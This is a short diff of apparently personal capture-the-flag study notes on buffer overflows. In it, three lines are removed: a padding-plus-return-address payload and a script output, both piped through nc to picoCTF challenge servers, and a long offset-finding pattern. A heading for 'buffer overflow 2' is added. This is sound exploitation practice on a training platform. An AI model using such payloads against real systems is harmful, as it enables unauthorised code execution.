@@ -497,13 +497,7 @@ check     checking.py.save  stack5     stack6_2.py
 checking  check.txt         stack5.py  stack6.py
 
 ```
-
- `(printf  "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK\xf6\x91\x04\x08" ; cat -) | nc [saturn.picoctf.net](http://saturn.picoctf.net/) 64167`
-
- `(python bo2_2.py ; cat -)` | nc [saturn.picoctf.net](http://saturn.picoctf.net/) 58955
-
-`AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ`ec
-
+# buffer overflow 2
 ![image.png](guide/sbopractice2.png)
 
 ```python
